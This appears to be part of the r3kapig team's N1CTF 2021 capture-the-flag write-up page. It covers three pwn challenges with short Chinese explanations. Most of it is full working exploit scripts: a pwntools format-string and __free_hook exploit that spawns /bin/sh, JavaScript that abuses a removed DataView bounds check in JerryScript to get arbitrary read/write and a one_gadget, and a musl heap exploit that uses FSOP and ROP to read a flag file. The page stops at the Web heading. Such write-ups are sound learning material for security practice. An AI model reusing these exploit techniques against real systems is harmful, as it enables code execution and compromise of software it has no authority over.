<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>N1CTF 2021 Writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for N1CTF 2021 Writeup" />
    <meta property="og:description" content="Writeup for N1CTF 2021 Writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
        
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#babyfmt">babyfmt</a>
    
                <a class="dropdown-item" href="#jerry">jerry</a>
    
                <a class="dropdown-item" href="#house_of_tataru">house_of_tataru</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#signin">signin</a>
    
                <a class="dropdown-item" href="#qqqueryyy-all-the-things">qqqueryyy-all-the-things</a>
    
                <a class="dropdown-item" href="#easyphp">easyphp</a>
    
                <a class="dropdown-item" href="#funny_web">funny_web</a>
    
                <a class="dropdown-item" href="#tornado">tornado</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                reverse
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#easyre">easyre</a>
    
                <a class="dropdown-item" href="#hello">hello</a>
    
                <a class="dropdown-item" href="#babyrust">babyrust</a>
    
                <a class="dropdown-item" href="#py">py</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#missingfunction">missingfunction</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
        <ul class="navbar-nav ml-auto">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#babyfmt" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babyfmt</span>
            </a>
    
<a href="#jerry" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">jerry</span>
            </a>
    
<a href="#house_of_tataru" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">house_of_tataru</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#signin" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">signin</span>
            </a>
    
<a href="#qqqueryyy-all-the-things" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">qqqueryyy-all-the-things</span>
            </a>
    
<a href="#easyphp" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">easyphp</span>
            </a>
    
<a href="#funny_web" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">funny_web</span>
            </a>
    
<a href="#tornado" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">tornado</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">reverse</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#easyre" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">easyre</span>
            </a>
    
<a href="#hello" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">hello</span>
            </a>
    
<a href="#babyrust" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babyrust</span>
            </a>
    
<a href="#py" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">py</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#missingfunction" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">missingfunction</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="n1ctf-2021-writeup"><a class="header-link" href="#n1ctf-2021-writeup"></a>N1CTF 2021 Writeup</h1>
<p>本次比赛我们获得了第二名的成绩</p>
<p class="img-container"><img src="https://i.imgur.com/DBz5XOb.png" alt=""></p>
<p>现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：<a href="mailto:root@r3kapig.com">root@r3kapig.com</a></p>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
<h3 id="babyfmt"><a class="header-link" href="#babyfmt"></a>BabyFMT</h3>
<p>修改了printf,和scanf。题目中有个fmtstr的漏洞，但是printf只剩下%r%m可以泄露，仔细看了下发现有个%\0的处理有问题会造成溢出所以泄露后把__free_hook链tache就可以getshell.</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level=<span class="hljs-string">'debug'</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span><span class="hljs-params">(c)</span>:</span>
    p.sendlineafter(<span class="hljs-string">"&gt;"</span>,str(c).encode(<span class="hljs-string">'utf-8'</span>))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,author=<span class="hljs-string">b"a"</span>,c=<span class="hljs-string">b'c'</span>)</span>:</span>
    cmd(<span class="hljs-number">1</span>)
    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b"Content size is "</span>+str(size).encode(<span class="hljs-string">'utf-8'</span>))
    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b"Book author is "</span>+author)
    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b"Book content is "</span>+c)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    cmd(<span class="hljs-number">2</span>)
    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b'Book idx is '</span>+str(idx).encode(<span class="hljs-string">'utf-8'</span>))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">puts</span><span class="hljs-params">(s,idx=<span class="hljs-number">0</span>)</span>:</span>
    cmd(<span class="hljs-number">3</span>)
    p.sendlineafter(<span class="hljs-string">":"</span>,<span class="hljs-string">b'Book idx is '</span>+str(idx).encode(<span class="hljs-string">'utf-8'</span>))
    p.sendlineafter(<span class="hljs-string">"You can show book by yourself\n"</span>,<span class="hljs-string">b'My format '</span>+s)

p=remote(<span class="hljs-string">"43.155.72.106"</span>,<span class="hljs-number">9999</span>)
<span class="hljs-comment">#p=process("./pwn")</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):
    add(<span class="hljs-number">0x68</span>)
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):
    free(x)
free(<span class="hljs-number">0</span>)
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    add(<span class="hljs-number">0x68</span>)
add(<span class="hljs-number">0x1</span>)

puts(<span class="hljs-string">b"%r%m%r"</span>,<span class="hljs-number">7</span>)
base=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b'\0\0'</span>)-(<span class="hljs-number">0x7ffff7facc61</span><span class="hljs-number">-0x7ffff7dc1000</span>)
log.warning(hex(base))
free(<span class="hljs-number">5</span>)

free(<span class="hljs-number">6</span>)
puts(<span class="hljs-string">b'%1%\0'</span>+<span class="hljs-string">b"\1"</span>*<span class="hljs-number">0x5e</span>+p64(<span class="hljs-number">0x1eeb28</span><span class="hljs-number">-0x10</span>+base))

<span class="hljs-comment">#puts(b'%\0'+b"\1"*0xb0+p64(0x1eeb28-0x10+base))</span>
add(<span class="hljs-number">0x68</span>)

<span class="hljs-comment">#gdb.attach(p,'b *malloc')</span>
puts(<span class="hljs-string">b"/bin/sh;%%%%%%%\x0011111"</span>+p64(<span class="hljs-number">0x55410</span>+base))
p.interactive()</code></pre><h3 id="jerry"><a class="header-link" href="#jerry"></a>Jerry</h3>
<p>通过 bindiff 比对，然后找到被修改的位置:</p>
<pre class="hljs"><code>diff --git a<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c b<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c
index <span class="hljs-number">45</span>db1e00..<span class="hljs-number">0</span>b4cac50 <span class="hljs-number">100644</span>
--- a<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c
+++ b<span class="hljs-regexp">/jerry-core/</span>ecma<span class="hljs-regexp">/operations/</span>ecma-dataview-object.c
@@ -<span class="hljs-number">108</span>,<span class="hljs-number">10</span> +<span class="hljs-number">108</span>,<span class="hljs-number">10</span> @@ ecma_op_dataview_create (const ecma_value_t *arguments_list_p, <span class="hljs-comment">/**&lt; arguments li
     }

     /* 8.b */</span>
-    <span class="hljs-keyword">if</span> (offset + byte_length_to_index &gt; buffer_byte_length)
-    {
-      <span class="hljs-keyword">return</span> ecma_raise_range_error (ECMA_ERR_MSG (<span class="hljs-string">"Start offset is outside the bounds of the buffer"</span>));
-    }
+    <span class="hljs-comment">// if (offset + byte_length_to_index &gt; buffer_byte_length)</span>
+    <span class="hljs-comment">// {</span>
+    <span class="hljs-comment">//   return ecma_raise_range_error (ECMA_ERR_MSG ("Start offset is outside the bounds of the buffer"));</span>
+    <span class="hljs-comment">// }</span>

     JERRY_ASSERT (byte_length_to_index &lt;= UINT32_MAX);
     view_byte_length = (uint32_t) byte_length_to_index;</code></pre><p>删掉了一个 DataView 创建时的长度合法性检测，这意味着我们申请的 DataView 长度可以大于 ArrayBuffer，从而实现 oob。有了 oobArray 就很简单了，基本步骤：</p>
<p>leak elf_base → leak got → leak libc → leak stack → hijack main_ret with one_gadget</p>
<pre class="hljs"><code><span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x10</span>)
<span class="hljs-keyword">var</span> buffer2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x10</span>)
data2=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(buffer,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)
data=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(buffer2,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)
data.setUint32(<span class="hljs-number">0</span>,<span class="hljs-number">0x41414141</span>)
data.setUint32(<span class="hljs-number">4</span>,<span class="hljs-number">0x41414141</span>)
data2.setUint32(<span class="hljs-number">0</span>,<span class="hljs-number">0x42424242</span>)
data2.setUint32(<span class="hljs-number">4</span>,<span class="hljs-number">0x42424242</span>)
jerry_gloal_heap_offset=<span class="hljs-number">0x68</span>
jerry_gloal_heap=data.getUint32(jerry_gloal_heap_offset+<span class="hljs-number">4</span>,<span class="hljs-literal">true</span>)*<span class="hljs-number">0x100000000</span>+data.getUint32(jerry_gloal_heap_offset,<span class="hljs-literal">true</span>)
text_base=jerry_gloal_heap<span class="hljs-number">-0x6d480</span>
realloc_got=text_base+<span class="hljs-number">0x00000000006bf00</span>+<span class="hljs-number">0x10</span>
print(jerry_gloal_heap.toString(<span class="hljs-number">16</span>))
print(text_base.toString(<span class="hljs-number">16</span>))
print(realloc_got.toString(<span class="hljs-number">16</span>))
data.setUint32(jerry_gloal_heap_offset,realloc_got&amp;<span class="hljs-number">0xffffffff</span>,<span class="hljs-literal">true</span>)

libc_base=data2.getUint32(<span class="hljs-number">4</span>,<span class="hljs-literal">true</span>)*<span class="hljs-number">0x100000000</span>+data2.getUint32(<span class="hljs-number">0</span>,<span class="hljs-literal">true</span>)<span class="hljs-number">-0x97b20</span>
print(libc_base.toString(<span class="hljs-number">16</span>))
env=libc_base+<span class="hljs-number">0x1e45a0</span><span class="hljs-number">-0x10</span>
print(env.toString(<span class="hljs-number">16</span>))
data.setUint32(jerry_gloal_heap_offset,env&amp;<span class="hljs-number">0xffffffff</span>,<span class="hljs-literal">true</span>)
data.setUint32(jerry_gloal_heap_offset+<span class="hljs-number">4</span>,env/<span class="hljs-number">0x100000000</span>,<span class="hljs-literal">true</span>)

stack=data2.getUint32(<span class="hljs-number">4</span>,<span class="hljs-literal">true</span>)*<span class="hljs-number">0x100000000</span>+data2.getUint32(<span class="hljs-number">0</span>,<span class="hljs-literal">true</span>)
print(stack.toString(<span class="hljs-number">16</span>))
ret_addr=stack<span class="hljs-number">-0x108</span><span class="hljs-number">-0x10</span>
ogg=libc_base+[<span class="hljs-number">0xde78c</span>,<span class="hljs-number">0xde78f</span>,<span class="hljs-number">0xde792</span>][<span class="hljs-number">1</span>]
data.setUint32(jerry_gloal_heap_offset,ret_addr&amp;<span class="hljs-number">0xffffffff</span>,<span class="hljs-literal">true</span>)
data.setUint32(jerry_gloal_heap_offset+<span class="hljs-number">4</span>,ret_addr/<span class="hljs-number">0x100000000</span>,<span class="hljs-literal">true</span>)
data2.setUint32(<span class="hljs-number">0</span>,ogg&amp;<span class="hljs-number">0xffffffff</span>,<span class="hljs-literal">true</span>)
data2.setUint32(<span class="hljs-number">4</span>,ogg/<span class="hljs-number">0x100000000</span>,<span class="hljs-literal">true</span>)</code></pre><h3 id="house_of_tataru"><a class="header-link" href="#house_of_tataru"></a>House_of_tataru</h3>
<p>菜单选项1不满足fail-safe的要求，可以随意修改大于0x1000的size。因为meta在heap上所以可以通过上面的那个漏洞读heap地址。然后bss上有几个freedchunk所以就可以先获得他们，之后猜一个bss和heap的偏移（最小1页最多0x2000页）然后就可以修改heap上的meta-&gt;mem，就可以通过选项1完成任意写。之后因为calloc还有exit里面都走了奇怪的分支把两个指针用任意写改掉，然后做FSOP+ROP就可以读flag，概率有点低是1/0x2000</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span><span class="hljs-params">(c)</span>:</span>
    p.sendafter(<span class="hljs-string">":"</span>,str(c).encode(<span class="hljs-string">'utf-8'</span>))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(magic=<span class="hljs-number">0xff</span>,idx=<span class="hljs-number">0</span>,c=<span class="hljs-string">b'A'</span>)</span>:</span>
    cmd(<span class="hljs-number">1</span>)
    p.send(p32(magic))
    p.send(p8(idx))
    <span class="hljs-keyword">if</span>(magic&lt;<span class="hljs-number">0x1000</span>):
        p.send(c)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span><span class="hljs-params">(idx=<span class="hljs-number">0</span>)</span>:</span>
    cmd(<span class="hljs-number">2</span>)
    p.send(p8(idx))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span><span class="hljs-params">(c,idx=<span class="hljs-number">0</span>)</span>:</span>
    cmd(<span class="hljs-number">3</span>)
    p.send(p8(idx))
    p.send(c)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx=<span class="hljs-number">0</span>)</span>:</span>
    cmd(<span class="hljs-number">4</span>)
    p.send(p8(idx))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ddd</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> p
    print(pidof(p))
    raw_input()
<span class="hljs-keyword">import</span> os
local=<span class="hljs-number">0</span>
<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>):
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span>(local):
            p=process(<span class="hljs-string">b"/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./pwn"</span>.split(<span class="hljs-string">b" "</span>))
        <span class="hljs-keyword">else</span>:
            p=remote(<span class="hljs-string">"43.155.68.132"</span>,<span class="hljs-number">23333</span>,timeout=<span class="hljs-number">90</span>)

        context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
        add(<span class="hljs-number">0xfff</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b"\1"</span>)
        add(<span class="hljs-number">0x888</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b'\2'</span>)


        add(<span class="hljs-number">0x1fd0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b'1'</span>)
        leave(<span class="hljs-number">1</span>)
        show(<span class="hljs-number">1</span>)
        p.read(<span class="hljs-number">0x30</span>)
        heap=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b'\0\0'</span>)-(<span class="hljs-number">0x55e4fd7ef1a8</span><span class="hljs-number">-0x000055e4fd7ef000</span>)
        log.warning(hex(heap))
        context.log_level=<span class="hljs-string">'error'</span>


        add(<span class="hljs-number">0x38</span>)<span class="hljs-comment"># </span>


        <span class="hljs-keyword">if</span>(local):
            pid=pidof(p)
            pid = str(pid)[<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>]
            ccc=f<span class="hljs-string">"sed -n '5p' /proc/{pid}/maps"</span>
            res=os.popen(ccc).read()[:<span class="hljs-number">12</span>]
            bss = int(<span class="hljs-string">"0x"</span>+res,<span class="hljs-number">16</span>)
            log.warning(hex(bss))
        <span class="hljs-keyword">else</span>:
            bss = heap<span class="hljs-number">-0x132000</span>

        target = heap-bss <span class="hljs-number">-0xfa0</span>
        <span class="hljs-comment">#log.warning(hex(target))</span>
        add(target+<span class="hljs-number">0xf0</span>)
        leave()

        show()
        p.read(<span class="hljs-number">0x30</span>)
        base=u64(p.read(<span class="hljs-number">6</span>)+<span class="hljs-string">b'\0\0'</span>)-(<span class="hljs-number">0x7efd9dcd1040</span><span class="hljs-number">-0x00007efd9dc1a000</span>)

        <span class="hljs-keyword">if</span>(base&amp;<span class="hljs-number">0xfff</span>!=<span class="hljs-number">0</span>):
            exit(<span class="hljs-number">1</span>)
        log.warning(hex(base))

        <span class="hljs-comment">#AAR</span>
        <span class="hljs-comment">#add(0x80,1,p64(0xdeadbeef))</span>
        FK = <span class="hljs-number">0x7f5a39a37f80</span><span class="hljs-number">-0x7f5a39981000</span>+base
        log.warning(<span class="hljs-string">"Calloc Guard-&gt;"</span>+hex(FK))
        add((<span class="hljs-number">0x140</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>),<span class="hljs-number">0</span>)
        leave()
        add((<span class="hljs-number">0x140</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>)+<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>)

        read(p64(FK<span class="hljs-number">-0x30</span>))
        add(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>))

        <span class="hljs-comment"># add(0xc0,1,p64(0xdeadbeef))#locate</span>

        GUARD = <span class="hljs-number">0x7fd7b6e3af20</span><span class="hljs-number">-0x7fd7b6d84000</span>+base<span class="hljs-comment"># exit guard</span>
        context.log_level=<span class="hljs-string">'debug'</span>
        log.warning(<span class="hljs-string">"Exit Guard-&gt;"</span>+hex(GUARD))
        add((<span class="hljs-number">0x168</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>),<span class="hljs-number">0</span>)
        leave()
        add((<span class="hljs-number">0x168</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>)+<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>)
        read(p64(GUARD<span class="hljs-number">-0x30</span>))


        add(<span class="hljs-number">0xb0</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b'\0'</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)*<span class="hljs-number">3</span>)
<span class="hljs-comment">#        add(0xd0,1,p64(0xdeadbeef))# locate</span>

        context.arch=<span class="hljs-string">'amd64'</span>
        rdx = <span class="hljs-number">0x000000000002cdae</span>+base
        rdi = <span class="hljs-number">0x00000000000152a1</span>+base
        rsi = <span class="hljs-number">0x000000000007897d</span>+base <span class="hljs-comment"># rbp</span>
        rax = <span class="hljs-number">0x0000000000016a96</span>+base
        leaver = <span class="hljs-number">0x000000000007b088</span>+base
        sys_read = <span class="hljs-number">0x7f2ea1052f10</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
        sys_open = <span class="hljs-number">0x7f2ea0ffda70</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
        sys_write = <span class="hljs-number">0x7f2ea1053700</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
        rebase = <span class="hljs-number">0x7f2ea10923f8</span><span class="hljs-number">-0x7f2ea0fde000</span>+base
        syscall = <span class="hljs-number">0x7b3f6</span>+base
        payload = flat([
            <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,
            <span class="hljs-number">0xdeadbeef</span>,
            <span class="hljs-number">0x0000000000016e7e</span>+base,
            <span class="hljs-number">0xb43c0</span>+base,
            <span class="hljs-number">0xb43c0</span>+base<span class="hljs-number">-0x40</span>,
            <span class="hljs-number">0xdeadbeef</span>,
            rsi,
            rebase,leaver,rdi,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0x1000</span>,sys_read,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0xffffffffffffffff</span>
        ])
        FSOP = <span class="hljs-number">0xb43a0</span>+base
        log.warning(<span class="hljs-string">"FSOP-&gt;"</span>+hex(FSOP))
        add((<span class="hljs-number">0xa0</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>),<span class="hljs-number">0</span>)
        leave()
        add((<span class="hljs-number">0xa0</span>+heap) - (bss+<span class="hljs-number">0xfa0</span>)+<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>)
        read(p64(FSOP<span class="hljs-number">-0x30</span>))

        add(<span class="hljs-number">0xd0</span>,<span class="hljs-number">1</span>,payload)
        <span class="hljs-comment">#ddd()</span>

        cmd(<span class="hljs-number">5</span>)
        rop=flat([
        rdi,rebase+<span class="hljs-number">0x199</span>,rsi,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0</span>,rax,<span class="hljs-number">2</span>,syscall,
        rdi,<span class="hljs-number">3</span>,rsi,rebase,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0x99</span>,sys_read,
        rdi,<span class="hljs-number">1</span>,rsi,rebase,<span class="hljs-number">0</span>,rdx,<span class="hljs-number">0x99</span>,sys_write
        ])
        p.send(rop.ljust(<span class="hljs-number">0x199</span>,<span class="hljs-string">b'\0'</span>)+<span class="hljs-string">b"./flag\0"</span>)

        t=p.readuntil(<span class="hljs-string">b"\n"</span>)
        res=p.read()
        print(res)
        log.warning(hex(base))
        raw_input()

        <span class="hljs-comment">#gdb.attach(p,'vmmap')</span>
        p.interactive()
    <span class="hljs-keyword">except</span> Exception:
        p.close()</code></pre><p>爆出来了 属于是欧皇的胜利了</p>
<p class="img-container"><img src="https://i.imgur.com/VZZ5dSY.png" alt=""></p>
<p>flag:n1ctf{U_Ar3_RE41LY_M43TeR_0f_Mus1!}</p>
<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
